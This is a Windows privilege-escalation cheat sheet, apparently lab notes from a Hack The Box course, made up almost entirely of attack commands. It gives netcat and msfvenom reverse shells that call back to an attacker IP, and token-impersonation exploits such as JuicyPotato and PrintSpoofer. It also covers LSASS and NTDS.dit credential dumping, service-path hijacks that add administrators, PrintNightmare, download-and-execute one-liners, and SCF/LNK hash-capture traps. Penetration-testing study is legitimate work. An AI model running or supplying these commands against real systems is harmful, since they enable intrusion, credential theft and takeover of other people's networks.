###### Tools
```
https://github.com/GhostPack/Seatbelt
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
https://github.com/GhostPack/SharpUp
https://github.com/411Hall/JAWS
https://github.com/Arvanaghi/SessionGopher
https://github.com/rasta-mouse/Watson
https://github.com/AlessandroZ/LaZagne
https://github.com/bitsadmin/wesng
https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
```
###### Binaries
```
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
https://github.com/AlessandroZ/LaZagne/releases/
```
###### Situational Awareness
```
ipconfig /all
arp -a
route print
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```
###### Enumeration
```
tasklist /svc													#running processes
set																#env cmd
systeminfo														#env ps
wmic qfe														#patches cmd
Get-HotFix | ft -AutoSize										#patches ps
wmic product get name											#installed programs cmd
Get-WmiObject -Class Win32_Product |  select Name, Version		#installed programs ps
netstat -ano													#running processes
query user														#current logins
echo %USERNAME%													#current user
whoami /priv
whoami /groups
net user														#get all users
net localgroup													#get all groups
net localgroup administrators									#group details
net accounts													#pw policy

netstat -ano													#network connections
pipelist.exe /accepteula										#named pipes (sysinternals)
gci \\.\pipe\													#named pipes powershell
accesschk.exe /accepteula \\.\Pipe\lsass -v						#LSASS named pipe permissions
accesschk.exe -accepteula -w \pipe\WindscribeService -v			#Example attack
.\accesschk.exe /accepteula -v \pipe\SQLLocal\SQLEXPRESS01		#Example2
```
### User Privileges
#### SeImpersonate and SeAssignPrimaryToken
###### JuicyPotato
```
impacket-mssqlclient <USER>@<IP> -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell whoami /priv
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.2 8443 -e cmd.exe" -t *
sudo nc -lnvp 8443
```
###### PrintSpoofer/RoguePotato
```
https://github.com/itm4n/PrintSpoofer
https://github.com/antonioCoco/RoguePotato
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.2 8443 -e cmd"
nc -lnvp 8443
```
#### SeDebugPrivilege
```
whoami /priv
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
#### SeTakeOwnership
```
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv

Get-ChildItem -Path 'C:\path\to\<FILE>' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
cmd /c dir /q ''C:\path\to\<FILE>'
takeown /f 'C:\path\to\<FILE>'
icacls 'C:\Path\to\<FILE>' /grant <USER>:F
```
### Group Privileges
###### Built-In Groups
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
whoami /priv
Set-SeBackupPrivilege
Get-SeBackupPrivilege
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt.txt' .\Contract.txt
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt .\flag.txt
cat .\Contract.txt
```
###### Attacking DC
```
diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
dir E:
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
###### reg backup
```
reg.exe save HKLM\SYSTEM SYSTEM.SAV
reg.exe save HKLM\SAM SAM.SAV
reg.exe save HKLM\SECURITY SECURITY.SAVE
```
#### NTDS.dit
###### DSInternals
```
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=<CN>,CN=<CN>,DC=<DOMAIN>,DC=<DOMAIN>' -DBPath .\ntds.dit -BootKey $key
```
###### impacket-secretsdump
```
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
###### Robocopy
```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
###### Event Log Readers
```
net localgroup "Event Log Readers"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
###### DnsAdmins
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll		#malicious dll
python3 -m http.server 7777																					#http server
wget "http://10.10.14.2:7777/adduser.dll" -outfile "adduser.dll"											#download file to target
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll								#loading dll as non-priv user
Get-ADGroupMember -Identity DnsAdmins																		#loading dll as DnsAdmin
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll								#loading custom dll
wmic useraccount where name="netadm" get sid																#finding users sid
sc.exe sdshow DNS																							#checking dns service perms
sc stop dns																									#stop dns
sc start dns
net group "Domain Admins" /dom																				#confirm group membership
```
###### WPAD Record
```
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <DC_HOSTNAME>
Add-DnsServerResourceRecordA -Name wpad -ZoneName <DOMAIN> -ComputerName <DC_HOSTNAME> -IPv4Address 10.10.14.2
```
###### Hyper-V Admins
```
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe						#target file
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe			#take ownership of file
sc.exe start MozillaMaintenance																	#start service
```
###### Print Operators
```
whoami /priv
https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"			#add reference to driver
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
.\DriverView.exe /stext drivers.txt																			#verify driver not loaded
cat drivers.txt | Select-String -pattern Capcom																#verify driver not loaded
EnableSeLoadDriverPrivilege.exe																				#verify priv enabled
```
###### Server Operators
```
sc qc AppReadiness																					#confirm running as system
c:\Tools\PsService.exe security AppReadiness														#check permissions
	 SERVICE_ALL_ACCESS
net localgroup Administrators																		#check local admin group membership
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"				#modify service binary path to execute a command
sc start AppReadiness																				#start the service
net localgroup Administrators																		#confirm local admin group membership
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'									#confirm local admin on the DC
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator									#get NTLM from DC
```
### Attacking the OS
###### User Account Control (UAC)
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA						#confirm UAC is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin		#check UAC level
[environment]::OSVersion.Version																							#check windows build
	https://en.wikipedia.org/wiki/Windows_10_version_history
	https://github.com/hfiref0x/UACME
#technique 54
cmd /c echo %PATH%																											#check path
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=8443 -f dll > srrstr.dll										#generate malicious dll
sudo python3 -m http.server 8080
curl http://10.10.14.2:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
nc -lvnp 8443
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe																			#run from nc session
```
###### Weak ACL Permissions
```
.\SharpUp.exe audit																				#look for service binaries with weak perms
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"									#check permissions on the binary
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"		#replace service binary with malicious binary
sc start SecurityService																		#start the service
```
###### Weak Service Permissions
```
SharpUp.exe audit
accesschk.exe /accepteula -quvcw WindscribeService												#check service permissions
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"		#change the service permission path
sc stop WindscribeService
sc start WindscribeService
net localgroup administrators
```
###### Unquoted Service Path
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """			"#search for unquoted service paths
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
sc qc SystemExplorerHelpService
```
###### Weak Registry ACL's
```
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services																								#check for weak service ACL's
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"		#change image path
```
###### Modifiable Autorun binaries
```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```
#### Kernel Exploits
###### Hive Nightmare
```
icacls c:\Windows\System32\config\SAM																				#checking SAM perms
.\HiveNightmare.exe
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```
###### Print Nightmare
```
ls \\localhost\pipe\spoolss																						#check for spooler service
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
net user hacker
```
###### Missing Patches
```
systeminfo
wmic qfe list brief
Get-Hotfix
	https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808		#update catalog
```
###### CVE-2020-0668
```
https://github.com/RedCursorSecurityConsulting/CVE-2020-0668
	CVE-2020-0668.exe
	CVE-2020-0668.exe.config
	CVE-2020-0668.pdb
	NtApiDotNet.dll
	NtApiDotNet.xml
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"																								#third party service to leverage
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.2 LPORT=8443 -f exe > maintenanceservice.exe																	#generate malicious binary
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"		#run the exploit
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"										#overwrite binary with malicious binary
#Make a resouce script for msf (handler.rc)
	use exploit/multi/handler
	set PAYLOAD windows/x64/meterpreter/reverse_https
	set LHOST 10.10.14.2
	set LPORT 8443
	exploit
sudo msfconsole -r handler.rc 																																					#run msf with script
net start MozillaMaintenance 																																					#start the service
```
###### Vulnerable Services
```
wmic product get name												#enumerate installed programs
netstat -ano | findstr 6064											#enumerate local ports
get-process -Id 3324												#enumerate PID
get-service | ? {$_.DisplayName -like 'Druva*'}						#enumerate running services
```
### Credential Theft
###### Hunting
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml																														#search for creds in configd
Get-ChildItem -Path C:\Users\ -Include *.txt,*.xml,*.ini,*.config,*.kdbx -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"						#ps search
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password															#creds in dictionary files
Unattend.xml
(Get-PSReadLineOption).HistorySavePath																																			#find ps history
gc (Get-PSReadLineOption).HistorySavePath																																		#read history
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}			#retrieve all ps history
```
###### Powershell Credentials
```
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```
###### Manual Hunting
```
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt			#file contents
findstr /si password *.xml *.ini *.txt *.config											#file contents
findstr /spin "password" *.*															#file contents
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password				#file contents ps
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*		#file extensions
where /R C:\ *.config																	#file extensions
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore	#file extensions ps
```
###### Sticky Notes
```
Set-ExecutionPolicy Bypass -Scope Process
PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROMfindstr /spin "password" *.* Note" | ft -wrap
strings plum.sqlite-wal
```
###### Notable Files
```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\\*
C:\Program Files\Windows PowerShell\\*
```
###### cmdkey
```
cmdkey /list												#saved credentials
runas /savecred /user:<DOMAIN>\<USER> "<COMMAND>"		#using saved creds
```
###### Browser Credentials
```
.\SharpChrome.exe logins /unprotect
```
###### Password Managers
```
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 												#extracting keepass hash
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt		#cracking
```
###### Lazagne
```
.\lazagne.exe all
```
###### Registry Passwords
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```
###### WiFi Passwords
```
netsh wlan show profile																			#show recent connections
netsh wlan show profile ilfreight_corp key=clear												#retrieving the passwords
```
### Additional Techniques
###### Process command line
```
python3 -m http.server 8000									#serve script
IEX (iwr 'http://10.10.10.205/procmon.ps1')					#read and execute script
```
###### SCF on a file share
```
@Inventory.scf												#put on share 
	[Shell]
	Command=2
	IconFile=\\10.10.14.2\share\legit.ico
	[Taskbar]
	Command=ToggleDesktop
sudo responder -w -v -I tun0								#start responder
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt		#crack hashes
```
###### Capture hashes with malicious lnk
```
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()

#linkbomb
https://github.com/dievus/lnkbomb
```
###### Restic
```
mkdir E:\restic2; restic.exe -r E:\restic2 init													#create location for backup
$env:RESTIC_PASSWORD = 'Superbackup'																#set pass
restic.exe -r E:\restic2\ backup C:\SampleFolder												#backup a directory
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot					#backup using VSS
restic.exe -r E:\restic2\ snapshots																#check saved backups
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore									#restore a backup
```
###### LOLBAS
```
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat						#file transfer with certutil
certutil -encode file1 encodedfile																#encoding file with certutil
certutil -decode encodedfile file2																#decode
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer						#install elevated settings
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer									#""
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi				#exploits AlwaysInstallElevated
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart							#execute
nc -lnvp 9443																					#catch a shell
```
###### Scheduled Tasks
```
schtasks /query /fo LIST /v																		#enumerate scheduled tasks
Get-ScheduledTask | select TaskName,State														#enumerate schtasks ps
.\accesschk64.exe /accepteula -s -d C:\Scripts\													#check perms on directory
```
###### User/Computer Descriptions
```
Get-LocalUser																					#checks for stored account details
Get-WmiObject -Class Win32_OperatingSystem | select Description									#computer description field
```
###### Mount VHDX/VMDK
```
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk												#mount vmdk
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1									#mount vhd/vhdx
```
###### Sherlock
```
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Sherlock.ps1
Find-AllVulns
```